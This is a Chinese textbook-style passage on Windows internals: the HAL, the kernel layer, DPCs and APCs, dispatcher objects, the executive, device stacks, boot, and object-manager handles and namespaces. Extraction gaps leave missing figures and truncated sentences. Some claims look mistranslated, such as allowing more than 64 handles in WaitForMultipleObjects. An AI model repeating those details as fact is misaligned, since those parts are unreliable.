在硬件层，一个设备在确定的总线上有一个
或多个地址。
因为现代计算机通常有多个总线(ISA 、PCI 、PCI-X 、US B 、1394 等),这就可能造成不
同总线上的多个设备有相同的地址，因此需要一些方法来区别它们。
HAL 把与总线相关的设备地址映射 为系统逻辑地址并以此来区分设备。
这样，驱动程序就无需知道何种设备与何种总线相关联。
这种机制 也保护了较高层避免进行总线结构和地址规约的交替。
有时需要在底层实现内核部件的同步，尤其是为了防止多处理机系统中的竞争环境。
HAL 提供基元管 理同步，如旋转锁，此时一个CPU等待其他CPU释放资源，比较特殊的情况是资源被几个机器指令占有。
设备寄存器设备地址 中断 DMA 定时器 自旋锁 固件
硬件抽象层
图11-12 一些HAL管理相关的硬件功能
2. 内核层
在硬件抽象层之上是NTOS, 包括两层：内核和执行体。
“内核”在Windows 中是一个易混淆的术语。
它可以指运行在处理机内核态下的所有代码，也可以指包含了Windows 操作系统内核NTOS 的 ntoskrnl.exe 文件，还可以指NTOS里的内核层，在本章中我们使用这个概念。
此外，“内核”甚至用来命 名用户态下提供本地系统调用的封装器的Win32库 ：kernel32.dll。
Windows操作系统的内核层(如图11-11所示，执行体之上)提供了一套管理CPU的抽象。
最核心 的抽象是线程，但是内核也实现了异常处理、陷阱以及各种中断。
支持线程的数据结构的创建和终止是 在执行体实现的。
内核层负责调度和同步线程。
在一个单独的层内支持线程，允许执行体在用户态下， 可以通过使用用来编写并行代码且相同优先级的多线程模型来执行，但同步原语的执行更专业。
内核中的线程调度程序负责决定哪些线程在系统的每一个CPU上执行。
线程会一直执行，直到产生 了一个定时器中断，或者是当线程需要等待一些事件发生，比如等待一个I/O 读写完成或是一个锁被释放， 或者是更高优先级的线程等待运行而需要CPU, 这时正在执行的线程会切换到另一个线程(时间片到期)。
当一个线程向另一个线程转换时，调度程序会在CPU上运行，并确保寄存器及其他硬件状态已保存。
然 后，调度程序会选择另一个线程在CPU上运行，并且恢复之前所保存的最后一个线程的运行状态。
如果下一个运行的线程是在一个不同的地址空间(例如进程),调度程序也必须改变地址空间。
详 细的调度算法我们将在本章内谈到进程和线程时讨论。
除了提供更高级别的硬件抽象和线程转换机制，内核层还有另外一项关键功能：提供对下面两种同 步机制低级别的支持：control 对象和dispatcher 对 象 。
Control 对象是内核层向执行体提供抽象的CPU管 理的一种数据结构。
它们由执行体来分配，但由内核层提供的例程来操作。
Dispatcher 对象是一种普通 执行对象，使用一种公用的数据结构来同步。
3.延迟过程调用
系统硬件为中断指定了硬件优先级。
在CPU进行工作时也伴随着一个优先级。
CPU 只响应比当前更 高优先级的中断。
通常的优先级是0,包括所有用户态下的优先级。
设备中断发生在优先级3或更高，让 一个设备中断的ISR以同一优先级的中断来执行是防止其他不重要的中断影响它正在进行的重要中断。
利用软中断延迟中断处理是一种行之有效的减少ISR 延迟时间的方法。
UNIX 和其他系统在20世纪 70年代开始使用延迟处理，以处理缓慢的硬件和有限的缓冲串行连接终端。
ISR 负责处理从硬件提取字 符并排列它们。
在所有高级别的中断处理完成以后，软中断将执行一个低优先级的ISR做字符处理，比 如通过向终端发送控制字符来执行一个退格键，以抹去最后一个显示字符并向后移动光标。
在当前的Windows操作系统下，类似的例子是键盘设备。
当一个键被敲击以后，键盘ISR从寄存器 中读取键值，然后重新使键盘中断，但并不对下一步的按键进行及时处理。
相反，它使用一个DPC去排 队处理键值，直到所有优先的设备中断已处理完成。
因为DPC在级别2上运行，它们并不干涉ISR设备的执行，在所有排队中的DPC执行完成并且CPU的 优先级低于2之前，它们会阻止任何线程的运行。
设备驱动和系统本身必须注意不要运行ISR或DPC太长 时间。
因为在运行它们的时候不能运行线程，ISR 或DPC的运行会使系统出现延迟，并且可能在播放音 乐时产生不连续，因为拖延了线程对声卡的音乐缓冲区的写操作。
DPC 另一个通常的用处是运行程序以 响应定时器中断。
为了避免线程阻塞，要延长运行时间的定时器事件需要向内核维持后台活动的线程工
作池做排队请求。
这些线程有调度优先级12、13或15。
我们会在线程调度部分看到，这些优先级意味着 工作项目将会先于大多数线程执行，但是不会打断实时线程。
4. 异步过程调用
另一个特殊的内核控制对象是APC (异步过程调用)对象。
APC 与DPC的相同之处是它们都是延迟 处理系统例行程序，不同之处在于DPC 是在特定的CPU 上下文中执行，而APC 是在一个特定的线程上下 文中执行。
当处理一个键盘敲击操作时，DPC 在哪一个上下文中运行是没有关系的，因为一个DPC 仅仅 是处理中断的另一部分，中断只需要管理物理设备和执行独立线程操作，例如在内核空间的一个缓冲区 记录数据。
当原始中断发生时，DPC 例程运行在任何线程的上下文中。
它利用I/O 系统来报告I/O操作已经完成， I/O 系统安排一个APC 在线程的上下文中运行从而做出原始的I/O 请求，在这里它可以访问处理输入的线 程的用户态地址空间。
在下一个合适的时间，内核层会将APC移交给线程而且调度线程运行。
一个APC被设计成看上去像 一个非预期的程序调用，有些类似于UNIX 中的信号处理程序。
不过在内核态下，内核态的APC 为了完 成I/O 操作，而在完成初始化I/O 操作的线程的上下文中执行。
这使APC既可以访问内核态的缓冲区，又 可以访问用户态下，属于包含线程的进程的地址空间。
一个APC 在什么时候被移交，取决于线程已经在 做什么,以及系统的类型是什么。
在一个多处理器系统中，甚至是在DPC 完成运行之前，接收APC的 线 程才可以开始执行。
用户态下的APC 也可以用来把用户态的I/O操作已经完成的信息，通知给初始化I/O 操作的线程。
但 只有当内核中的目标线程被阻塞和被标示为准备接收APC时，用户态下的APC 才可调用用户态下的应用 程序。
但随着用户态堆栈和寄存器的修改，为了执行在ntdll.d1I系统库中的APC 调度算法，内核将等待中 的线程中断，并返回到用户态。
APC 调度算法调用和I/O操作相关的用户态应用程序。
除了一些I/O 完成后， 作为一种执行代码方法的用户态下的APC 外 ，Win32 API中 的QueueUserAPC 允许将APC 用于任意目的。
执行体也使用除了I/O 完成之外的一些APC 操作。
由于APC 机制精心设计为只有当它是安全的时候 才提供APC, 它可以用来安全地终止线程。
如果这不是一个终止线程的好时机，该线程将宣布它已进入 一个临界区，并延期交付APC直至得到许可。
在获得锁或其他资源之前，内核线程会标记自己已进入临 界区并延迟APC, 这时，它们不能被终止，并仍然持有资源。
5. 调度对象
另一种同步对象是调度对象。
这是常用的内核态对象(一种用户可以通过句柄处理的类型),它包 含一个称为dispatcher_header 的数据结构，如图11-13所示。
它们包括信号器、互斥体、事件、可等待 定时器和其他一些可以等待其他线程同步执行的对象。
它们还包括表示打开的文件的对象、进程、线程 和IPC端口的对象。
调度数据结构包含了表示对象状态的标志和等待被标记的对象的线程队列。
图11-13 执行体对象中嵌入的dispatcher_header数据结构(分派器对象)
同步原语，如信号器，是标准的调度对象。
另外定时器、文件、端口线程和进程使用调度对象机制 去通知。
当一个定时器开启、 一个文件I/O 完成、 一个端口正在传输数据或是一个线程或进程终止时， 相关的调度对象会被通知，并唤醒所有等待该事件的线程。
由 于Windows 使用了一个单一的标准机制去同步内核态对象， 一些专门的API就无需再等待事件， 例如在UNIX 中用来等待子进程的wait3 。
而通常情况下，线程要一次等待多个事件。
在UNIX中 ， 通 过 “select” 系统调用， 一个进程可以等待任何一个64位网络接口可以获得的数据。
在Windows 中亦有一个
类似的API WaitForMultipleObjects, 但是它允许一个线程等待任何类型的有句柄的调度对象。
超过64 个句柄可以指定WaitForMultipleObjects, 以及一个可选择的超时值。
线程随时准备运行任何一个和句柄 标记相关的事件或发生超时。
内核使用两个不同的程序使得线程等待调度对象运行。
发出一个通知对象信号使每一个等待的线程 可以运行。
同步对象仅使第一个等待的线程可以运行，用于调度对象，实施锁元，如互斥体。
当一个线 程等待一个锁再次开始运行，它做的第一件事就是再次尝试请求锁。
如果一次仅有一个线程可以保留锁， 其他所有可运行的线程可能立刻被阻塞，从而产生许多不必要的现场交换。
使用同步机制和使用通知机 制的分派对象 (dispatcher object) 之间的差别是dispatcher_hea der 结构中的一个标记。
另外，在Windows 代码中互斥体称为“变体”(mutant) 。
因为当一个线程保留一个出口时，它们需 要执行OS/2语义中的非自动解锁，看来这是Cutler 奇特的考虑。
6.执行体
如图11-11所示，在NTOS的内核层以下是执行体。
执行体是用C语言编写的，在结构上最为独立 (内存管理是一个明显的例外),并且经过少量的修改已经移植到新的处理器上(MIPS 、x86 、PowerPC 、 Alpha 、IA64和x64) 。
执行体包括许多不同的组件，所有的组件都通过内核层提供的抽象控制器来运行。
每个组件分为内部和外部的数据结构和接口。
每个组件的内部方法是隐藏的，只有组件自己可以调 用，而外部方法可以由执行体的所有其他组件调用。
外部接口的一个子集由一个ntoskrnl.exe提供，而且 设备驱动可以链接到它们，就好像执行体是一个库。
微软称许多执行体组件为“管理器”,因为每一个 组件管理操作系统的一部分，例如I/O 、内存、进程、对象等。
对于大多数操作系统而言，许多功能在Windows上执行就像库的代码。
除非在内核方式下运行，它 的数据结构可以被共享和保护，以避免用户态下的代码访问，因此它具有硬件状态的访问权限，例如 MMU控制寄存器。
但是另一方面，执行体只是代表它的调用者简单执行操作系统的函数，因此它运行 在它的调用者的线程中。
当任何执行体函数阻塞等待与其他线程同步时，用户态线程也会阻塞。
这在为一个特殊的用户态线 程工作时是有意义的，但是在做一些相关的内务处理任务时是不公平的。
当执行体认为一些内务处理线 程是必需的时候，为了避免劫持当前的线程，一些内核态线程就会具体于特定的任务而产生，例如确保 更改了的页会被回写到硬盘上。
对于可预见的低频率任务，会有一个线程一秒运行一次而且由一个长的项目单来处理。
对于不可预 见的工作，有一个之前曾经提到的高优先级的辅助线程池，通过将队列请求和发送辅助线程等待的同步 事件信号，可以用来运行有界任务。
对象管理器管理在执行体使用的大部分内核态对象，包括进程、线程、文件、信号、I/O 设备及驱 动、定时器等。
就像之前提到的，内核态对象仅仅是内核分配和使用的数据结构。
在Windows中，内核 数据结构有许多共同特点，即它们在管理标准功能中特别有用。
这些功能由对象管理器提供，包括管理对象的内存分配和释放，配额计算，支持通过句柄访问对象， 为内核态指针引用保留引用计数，在NT名字空间给对象命名，为管理每一个对象的生命周期提供可扩 展的机制。
需要这些功能的内核数据结构是由对象管理器来管理的。
对象管理器的每一个对象都有一个类型用来详细指定这种类型的对象的生命周期怎样被管理。
这些 不是面向对象意义中的类型，而仅仅是当对象类型产生时的一个指定参数集合。
为了产生一个新的类型， 一个操作元件只需要调用一个对象管理器API即可。
对象在Windows 的函数中很重要，在下面的章节中 将会讨论有关对象管理器的更多细节。
最新的Windows版本对在用户态上运行设备驱动程序有更多的支持，这对新的设备驱动程序是首选 的模式。
Windows 有超过100万不同的设备驱动程序，工作着超过了100万不同的设备。
这就意味着要获
取正确的代码。
漏洞导致设备在用户态的进程中崩溃而不能使用，这比造成对系统进行检测错误要好得 多。
错误的内核态设备驱动是导致Windows 可怕的BSOD (蓝屏死机)的主要来源，它是Windows侦测到 致命的内核态错误并关机或重新启动系统。
蓝屏死机可以类比于UNIX系统中的内核恐慌。
我们会在11.7节对I/O做进一步研究，在11.8节中介绍最重要的NT文件系统NTFS。
进程管理器管理着进程和线程的创建和终止，包括建立规则和参数指导它们。
但是线程运行方面由 内核层决定，它控制着线程的调度和同步，以及它们之间相互控制的对象，如APC。
进程包含线程、地 址空间和一个可以用来处理进程指定内核态对象的句柄表。
进程还具有调度器进行地址空间交换和管理 进程中的具体硬件信息(如段描述符)所需要的信息。
我们将在11.4节研究进程和线程的管理。
高速缓存管理器优化I/O的性能，文件系统内核虚拟地址空间保持一个高速缓存的文件系统页。
高 速缓存管理器使用虚拟的地址进行缓存，也就是说，按照它们文件所在位置来组织缓存页。
这不同于物 理块高速缓存，例如在UNIX中，系统为原始磁盘卷保持一个物理地址块的内存。
高速缓存的管理是使用内存映射文件来实现的。
实际的缓存是由内存管理器完成。
高速缓存管理器 需要关心的只是文件的哪些部分需要高速缓存，以确保缓存的数据即时地刷新到磁盘中，并管理内核虚 拟地址映射缓存文件页。
如果一个页所需的I/O 文件在缓存中没有，该页在使用高速缓存管理器时将会 发生错误。
我们会在11.6节中介绍高速缓存管理器。
安全引用监视器 (security reference monitor)执行Windows 详细的安全机制，以支持计算机安全要 求的国际标准的通用标准 (Common Criteria),一个由美国国防部的橘皮书的安全要求发展而来的标准。
这些标准规定了一个符合要求的系统必须满足的大量规则，如登录验证、审核、零分配的内存等更多的 规则。
一个规则要求，所有进入检查都由系统中的一个模块进行检查。
在Windows中此模块就是内核中 的安全监视器。
我们将在11.9节中更详细地学习安全系统。
这一种基于状态的方法使得WNF相对于其他的进程间通信方式有了很大的优势：发布者和订阅者 相互之间进行了解耦合，它们可以独立地开启和关闭。
发布者不需要在启动时就运行，而是只需要初始 化它对应的状态数据，且这些数据可以在操作系统重启的时候被保存下来。
订阅者在开始运行时并不需 要了解其对应数据的历史值，取而代之是当下的状态(其包含了一些历史信息)。
在一个历史状态无法 被详细概括的情况下，当下的状态会提供一些原始数据以用于管理历史状态。
例如，放在一个文件或对 象文件用于循环的持久缓冲区。
WNF 是原始NT API的一部分，并且目前还没暴露在Win32 接口之中。
但是它在系统内部被广泛用于实现Win32和WinRT API。
Windows NT 4.0中的许多代码与Win32进入内核的图形界面相关，因为当时的硬件无法提供所需的 性能。
该代码以前位于csrss.exe 子系统进程，执行Win32接口。
以内核为基础的图形用户界面的代码位 于一个专门的内核驱动win32k.sys 中。
这一变化预计将提高Win32的性能，因为额外的用户态/内核态的 转换和转换地址空间的成本经由LPC执行通信是被清除的。
但并没能像预期的那样取得成功，因为运行 在内核中的代码要求是非常严格的，运行在内核态上的额外消耗抵消了因减少交换成本获得的收益。
7.设备驱动程序
图11-11的最后一部分是设备驱动程序的 组 成 。
在Windows 中的设备驱动程序的动态链接库是由NTOS
I/O 管理器组织的数据按照一定的路线流经过每个设备实例，如图11-14所示。
这个路线称为设 备 栈 ，由
图11-14 简单描绘两个NTFS 文件卷的设备栈。
I/O 请求包由上往下通过栈。
每一级堆栈中的相关驱动中的 适当程序被调用。
该设备栈由分配给每个堆栈的设备对象组成
分配到这条路线上的内核设备对象的私有实例组成。
设备堆栈中的每个设备对象与特定的驱动程序对象 相关联，其中包含日常使用的I/O 请求的数据包流经该设备堆栈的表。
在某些情况下，堆栈中的设备驱 动程序唯一的目的是针对某一特定的设备、总线或网络驱动程序过滤I/O操作。
过滤器的使用是有一些 原因的。
有时预处理或后处理I/O 操作可以得到更清晰的架构，而其他时候只是以实用为出发点，因为 没有修改驱动的来源和权限，过滤器是用来解决这个问题的。
过滤器还可以全面执行新的功能，如把磁 盘分区或多个磁盘分成RAID 卷。
网络协议也作为使用I/O模型的驱动被装载起来，例如Windows 整合的IPv4/IPv6 TCP/IP实现。
对于 老的基于MS-DOS 的Windows 操作系统，TCP/IP 驱动实现了一个特殊的Windows I/O模型网络接口上的 协议。
还有其他一些驱动也执行这样的安排，Windows 称之为微型端口。
共享功能是在 一个类驱动程序 中 。
例 如 ，SCSI 、IDE 磁盘或USB设备的通用功能是作为类驱动提供的，这个类驱动为这些设备的每个 特定类型提供微型端口驱动程序，并连接为一个库。
我们在本章不讨论任何特定的设备驱动，但是在11.7节中将更为详细地介绍I/O 管理器如何与设备 驱动互动的相关内容。
11.3.2 启 动Windows
使用操作系统需要运行几个步骤。
当电脑打开时，CPU 初始化硬件。
然后开始执行内存中的一个程 序。
但是，唯一可用的代码是由计算机制造商初始化的某些非易失性的CMOS内存形式(有时被用户更 新，在一个进程中称为闪存)。
因为这个软件是固化在内存中的，并且很少被更新，所以它一般被称为 固 件 。
这些固件被主板制造商或操作系统制造商写在了计算机中。
历史上计算机的固件一般被称作 BIOS (基础输入输出系统),但最新的计算机中采用了新的UEFI (统一可扩展固件接口)。
UEFI 改善了 BIOS 的一些问题，支持新的硬件，提供一个独立于CPU 架构的模块化架构，支持一个新的模块以用于 网络启动计算机，提供新的计算机以及运行检测程序。
Windows 启动程序在遇到系统启动失败时，有专门处理常用问题的逻辑。
有时安装一个坏的设备驱 动程序，或运行一个像注册表一样的程序(能导致系统储巢损坏),会阻止系统正常启动。
系统提供了 一种功能来支持忽略最近的变化并启动到最近一次的系统正确配置。
其他启动选项包括安全启动，它 关 闭了许多可选的驱动程序。
还有故障恢复控制台，启动cmd.exe 命令行窗口，它提供了一个类似UNIX的 单用户态。
另一个常见的问题，用户认为，一些Windows系统偶尔看起来很不可思议，经常有系统和应用程序 的(看似随机)崩溃。
从微软的在线崩溃分析程序得到的数据，提供了许多崩溃是由于物理内存损坏导 致的证据。
所以Windows 启动进程提供了一个运行广义上的内存诊断的选项。
也许未来的PC 硬件将普遍 支持ECC (或者部分)支持ECC 内存，但是今天的大多数台式机和笔记本电脑系统很容易受到攻击，甚 至是在它们所包含的数十亿比特的内存中的单比特错误。
11.3.3 对象管理器的实现
对象管理器也许是Windows可执行过程中一个最重要的组件，这也是为什么我们已经介绍了它的许 多概念。
如前所述，它提供了一个统一的和一致的接口，用于管理系统资源和数据结构，如打开文件、 进程、线程、内存部分、定时器、设备、驱动程序和信号。
更为特殊的对象可以表示一些事物，像内核 的事务、外形、安全令牌和由对象管理器管理的Win32桌面。
设备对象和I/O系统的描述联系在一起，包 括提供NT名字空间和文件系统卷之间的链接。
配置管理器使用一个key类型的对象与注册配置相链接。
对象管理器自身有一些对象，它用于管理NT名字空间和使用公共功能来实现对象。
在这些目录中，有 象征性的联系和对象类型的对象。
由对象管理器提供的统一性有不同的方面。
所有这些对象使用相同的机制，包括它们是如何创建、 销毁以及定额分配值的占有。
它们都可以被用户态进程通过使用句柄访问。
在内核的对象上有一个统一的 协议管理指针的引用。
对象可以从NT的名字空间(由对象管理器管理)中得到名字。
调度对象(那些以 信号事件相关的共同数据结构开始的对象)可以使用共同的同步和通知接口，如WaitForMultipleObjects。
有一个共同的安全系统，其执行了以名称来访问的对象的ACL, 并检查每个使用的句柄。
甚至有工具帮 助内核态开发者，在使用对象的过程中追踪调试问题。
理解对象的关键，是要意识到一个(执行)对象仅仅是内核态下在虚拟内存中可以访问的一个数据 结构。
这些数据结构，常用来代表更抽象的概念。
例如，执行文件对象会为那些已打开的系统文件的每 一个实例而创建。
进程对象被创建来代表每一个进程。
一种事实上的结果是，对象只是内核数据结构，当系统重新启动时(或崩溃时)所有的对象都将丢 失。
当系统启动时，没有对象存在，甚至没有对象类型描述。
所有对象类型和对象自身，由对象管理器 提供接口的执行体的其他组件动态创建。
当对象被创建并指定一个名字，它们可以在以后通过NT名字 空间被引用。
因此，建立对象的系统根目录还建立了NT名字空间。
对象结构如图11-15所示。
每个对象包含一个对所有类型的所有对象的某些共性信息头。
在信息头 中包括在名字空间内的对象名称、对象目录，并指向安全描述符代表的ACL对象。
508 第 1 1 章
以及更高优先级的对象访问的任何数据结构和内核态对象，无分页内存都是需要的。
这包括ISR和DPC ( 但 不包括APC) 和线程调度本身。
该页面故障处理也需要由无分页内核内存分配的数据结构，以避免递归。
大部分来自内核堆管理器的分配，是通过使用每个处理器后备名单来获得的，这个后备名单中包含 分配大小一致的LIFO 列表。
这些LIFO 优化不涉及锁的运作，可提高系统的性能和可扩展性。
每个对象头包含一个配额字段，这是用于对进程访问一个对象征收配额。
配额是用来保持用户使用 较多的系统资源。
对无分页核心内存(这需要分配物理内存和内核虚拟地址)和分页的核心内存(使用了 内核虚拟地址)有不同的限制。
当内存类型的累积费用达到了配额限制，由于资源不足而导致给该进程的 分配失败。
内存管理器也正在使用配额来控制工作集的大小和线程管理器，以限制CPU的使用率。
物理内存和内核虚拟地址都是宝贵的资源。
当一个对象不再需要，应该取消并回收它的内存和地址。
但是，如果一个仍在被使用的对象收到新的请求，则内存可以被分配给另一个对象，然而数据结构有可 能被损坏。
在Windows 执行体中很容易发生这样的问题，因为它是高度多线程的，并实施了许多异步操 作(例如，在完成特定数据结构之上的操作之前，就返回这些数据结构传递给函数的调用者)。
为了避免由于竞争条件而过早地释放对象，对象管理器实现了一个引用计数机制，以及引用指针的 概念。
需要一个参考指针来访问一个对象，即便是在该物体有可能正要被删除时。
根据每一个特定对象 类型有关的协议里面，只有在某些时候一个对象才可以被另一个线程删除。
在其他时间使用的锁，数据 结构之间的依赖关系，甚至是没有其他线程有一个对象的指针，这些都能够充分保护一个对象，使其避 免被过早删除。
1.句柄
用户态引用内核态对象不能使用指针，因为它们很难验证。
相反内核态对象必须使用一些其他方式
图11-17显示，句柄表最大支持两个额外的间接层。
这使得在内核态中执行代码能够方便地使用句柄，而不 是引用指针。
内核句柄都是经过特殊编码的，从而它们
句柄表描述符 A: 句柄表项[512]
表指针
对象 对象
对象
图11-16 使用一个单独页达到512个句柄的 最小表的句柄表数据结构
能够与用户态的句柄区分开。
内核句柄都保存在系统进程的句柄表里，而且不能以用户态存取。
就像大 部分内核虚拟地址空间被所有进程共享，系统句柄表由所有的内核成分共享，无论当前的用户态进程是 什么。
句柄表描述符 D: 句柄表指针[32]
图11-17 最多达到1600万个句柄的句柄表数据结构
实例研究2: Windows 8 509
用户可以通过Win32调用的CreateSemaphore 或OpenSemaphore 来创建新的对象或打开一个已经 存在的对象。
这些都是对程序库的调用，并且最后会转向适当的系统调用。
任何成功创建或打开对象的 指令的结果，都是储存在内核内存的进程私有句柄表的一个64位句柄表入口。
表中句柄逻辑位置的32位 索引返回给用户用于随后的指令。
内核的64位句柄表入口包含两个32位字节。
一个字节包含29位指针指 向对象。
其后的3位作为标志(例如，表示句柄是否被它创建的进程继承)。
这3位在指针就位以前是被 屏蔽掉的。
其他的字节包含一个32位正确掩码。
这是必需的因为只有在对象创建或打开的时候许可校验 才会进行。
如果一个进程对某对象只有只读的权限，那在表示其他在掩码中的权限位都为0,从而让操 作系统可以拒绝除读之外对对象进行任何其他的操作。
2.对象名字空间
进程可以通过由一个进程把到对象的句柄复制给其他进程来共享对象。
但是这要求复制进程有其他 进程的句柄，而这样在多数情况中并不适用，例如进程共享的对象是无关的或被其他进程保护的。
在其 他情况下，对象即使在不被任何进程调用的时候仍然保持存在是非常重要的，例如表示物理设备的对象， 或用户实现对象管理器和它自己的NT名字空间的对象。
为了地址的全面分享和持久化需求，对象管理 允许随意的对象在被创建的时候就给定其NT 名字空间中的名字。
然而，是由执行部件控制特定类型的 对象来提供接口，以使用对象管理器的命名功能。
NT 名字空间是分级的，借由对象管理器实现目录和特征连接。
名字空间也是可扩展的，通过提供 一个叫作Parse的进程程序允许任何对象类型指定名字空间扩展。
Parse 程序是一个可以提供给每一个对 象类型的对象创建时使用的程序，如图11-18所示。
图11-18 用于指定一个新对象类型的对象语句
Open 语句很少使用，因为默认对象管理器的行为才是必需的，所以程序为所有基本对象类型指定 为NULL。
Close 和Delete语句描述对象完成的不同阶段。
当对象的最后一个句柄关闭，可能会有必要的动作清 空状态，这些由Close 语句来执行，当最后的指针参考从对象移除，使用Delete 语句，从而对象可以准备 被删除并使其内存可以重用。
利用文件对象，这两个语句都实现为I/O管理器里面的回调，I/O 管理器是 声明了对象类型的组件。
对象管理操作使得由设备堆栈发送的I/O 操作能够与文件对象关联上，而大多 数这些工作由文件系统完成。
Parse 语句用来打开或创建对象，如文件和登录密码，以及扩展NT名字空间。
当对象管理器试图通 过名称打开一个对象并遇到其管理的名字空间树的叶结点，它检查该叶结点对象类型是否指定了一个 Parse语句。
如果有，它会引用该语句，将路径名中未用的部分传给它。
再以文件对象为例，叶子结点是 一个表现特定文件系统卷的设备对象。
Parse 语句由I/O管理器执行，并发起在对文件系统的I/O操作，以 填充一个指向文件的公开实例到该文件对象，这个文件是由路径名指定的。
我们将在以后逐步探索这个 特殊的实例。
QueryName 语句是用来查找与对象关联的名字。
Security 语句用于得到、设置或删除该安全描述符 的对象。
对于大多数类型的对象，此程序在执行的安全引用监视器组件里提供一个标准的切入点。
分有用。
例如一些系统调用，NtReadFile 和NtWriteFile 都利用由对象管理器创建的句柄表将句柄转化为 基础对象的引用指针(例如一个文件对象),这些基础对象包含了实现相关系统调用所需要的数据。
sysinternals 可免费获得。
在运行时，此工具描绘的对象的名字空间通常包含对象目录，如图11-19列出来 的及其他一些。
图11-19 在对象名字空间中的一些典型目录
如上所述，对象管理器保持一个单独的句柄为每个对象计数。
这个计数是从来不会大于指针引用计 数，因为每个有效的句柄对象在它的句柄表入口有一个引用指针。
使用单独句柄计数的理由是，当最后 一个用户态的引用消失的时候，许多类型的对象可能需要清理自己的状态，尽管它们尚未准备好让它们 的内存删除。
以一个文件对象为例表示一个打开文件的实例。
Windows 系统中文件被打开以供独占访问。
当文件 对象的最后一个句柄被关闭，重要的是在那一刻就应该删除专有访问，而不是等待任何内核引用最终消 失(例如，在最后一次从内存冲洗数据之后。
)否则，从用户态关闭并重新打开一个文件可能无法按预 期的方式工作，因为该文件看来仍然在使用中。
虽然对象管理器在内核具有全面的管理机制来管理内核中的对象生命周期，不论是NT API或Win32 API的都没有提供一个引用机制来处理在用户态的并行多线程之间的句柄使用。
从而多线程并发访问句 柄会带来竞争条件 (race condition) 和bug, 例如，可能发生一个线程在别的线程使用完特定的句柄之 前就把它关闭了。
或者多次关闭一个句柄。
或者关闭另一个线程仍然在使用的句柄，然后重新打开它指 向不同的对象。
为了帮助程序开发人员在他们的程序中寻找这些类似的问题，Windows 有一个应用程序验证，软件
开发商能够从Microsoft 下载。
我们将在11.7节介绍类似的驱动程序的验证器，应用程序验证器通过大量 的规则检查来帮助程序员寻找可能通过普通测试无法发现的错误。
它也可以为句柄释放列表启用先进先 出顺序，以便句柄不会被立即重用(即关闭句柄表通常采用效果较好的LIFO 排序)。
防止句柄被立即重 用的情况发生，在这些转化的情况下操作可能错误地使用一个已经关闭的句柄，这是很容易检测到的。
该设备对象是执行体中一个最重要的和贯穿内核态的对象。
该类型是由I/O管理器指定的，I/O 管理 器和设备驱动是设备对象的主要使用者。
设备对象和驱动程序是密切相关的，每个设备对象通常有一个 链接指向一个特定的驱动程序对象，它描述了如何访问设备驱动程序所对应的I/O处理例程。
设备对象代表硬件设备、接口和总线，以及逻辑磁盘分区、磁盘卷甚至文件系统、扩展内核，例如 防病毒过滤器。
许多设备驱动程序都有给定的名称，这样就可以访问它们，而无需打开设备的实例的句 柄，如在UNIX中。
我们将利用设备对象以说明Parse 程序是如何被使用的，如图11-20所示。
图11-20 I/O 和对象管理器创建/打开文件并返回文件句柄的步骤
1)当一个执行体组件(如实现了本地系统调用NTCreateFile 的 I/O管理器)调用对象管理器中的 ObOpenObjectByName 时，它发送一个NT名字空间的Unicode 路径名，例如\?
\C:\foo\bar。
2)对象管理器通过目录和符号链接表搜索并最终认定\?
\C: 指的是设备对象 (I/O 管理器定义的一 个类型)。
该设备对象在由对象管理器管理的NT名字空间中一个叶节点。
3)然后对象管理器为该对象类型调用Parse 程序，这恰好是由I/O管理器实现的lopParseDevice 。
它 不仅传递一个指针给它发现的设备对象(C:), 而且还把剩下的字符串\foo\bar也发送过去。
4)I/O 管理器将创建一个IRP(I/O 请求包),分配一个文件对象，发送请求到由对象管理器确定的 设备对象发现的I/O设备堆栈。
5)IRP 是在I/O 堆栈中逐级传递，直到它到达一个代表文件系统C: 实例的设备对象。
在每一个阶段， 控制是通过一个与这一等级设备对象相连的切入点传递到驱动对象内部。
切入点用在这种情况下，是为
了支持CREATE操作，因为要求是创建或打开一个名为\foo\bar 的文件。
6)该设备对象中遇到指向文件系统的IRP 可以表示为文件系统筛选驱动程序，这可能在该操作到达对 应的文件系统设备对象之前修改I/O操作。
通常情况下这些中间设备代表系统扩展，例如反病毒过滤器。
7)文件系统设备对象有一个到文件系统驱动程序对象(如NTFS) 的链接。
因此，驱动对象包含 NTFS 内创建操作的地址范围。
8)NTFS 将填补该文件中的对象并将它返回到I/O管 理 器 ，I/O 管理器备份堆栈中的所有设备，直到 lopParseDevice 返回对象管理器(如11.8节所述)。
9)在对象管理器以其名字空间中的查找结束。
它从Parse 程序收到一个初始化对象(这正好是一个 文件对象，而不是原来对象发现的设备对象)。
因此，对象管理器为文件对象在目前进程的句柄表里创
建了一个句柄，并对需求者返回句柄。
10)最后一步是返回用户态的调用者，在这个例子里就是Win32 API CreateFile,它会把句柄返回 给应用程序。
可执行组件能够通过调用ObCreateObjectType 接口给对象管理器来动态创建新的类型。
由于每次 发布都在变化，所以没有一个限定的对象类型定义表。
图11-21列出了在Windows中非常通用的一些对象 类型，供快速参考。
图11-21 对象管理器管理的一些通用可执行对象类型
进程 (process) 和线程 (thread) 是明显的。
每个进程和每个线程都有一个对象来表示，这个对象 包含了管理进程或线程所需的主要属性。
接下来的三个对象：信号量、互斥体和事件，都可以处理进程 间的同步。
信号量和互斥体按预期方式工作，但都需要额外的响铃和警哨(例如，最大值和超时设定)。
事件处于两种状态之一：已标记信号或未标记信号。
如果一个线程等待事件处于已标记信号状态，线程 被立即释放。
如果该事件是未标记信号状态，它会一直阻塞直到一些其他线程通知该事件，这将释放所 有被阻塞的线程(通知事件)或只是释放掉第一个被阻塞的线程(同步事件)。
也可以设置一个事件， 这样一种信号成功等待后，它会自动恢复到该未标记信号的状态而不是处在已标记信号状态。
端口、定时器和队列对象也与通信和同步相关。
端口是进程之间交换LPC消息的通道。
定时器提供 一种在特定的时间区间内阻塞的方法。
队列(在内部被称为KQUEUES) 用于通知线程已完成以前启动 的异步I/O 操作，或一个端口有消息等待。
(它们被设计来管理应用程序中的并发的水平，以及在高性 能多处理器应用中使用，如SQL)。
当一个文件被打开时，Open file对象将会被创建。
没打开的文件，并没有对象由对象管理器管理。
访问令牌是安全的对象。
它们识别用户，并指出用户具有什么样的特权，如果有的话。
配置文件是线程 的用于存储程序计数器的正在运行的周期样本的数据结构，用以确定程序线程的时间是花在哪些地方了。
对象目录和符号链接完全是本地对象管理器的 NT 名字空间的一部分。
它们类似于和它们对应的文 件系统部分：目录允许相关的对象被收集起来。
符号链接允许对象名字空间来引用一个对象名字空间的 不同部分中的对象的一部分的名称。
其他没有介绍的对象有更多特别的目的，如同内核事务的交互或Win32线程池的工作线程工厂交互。
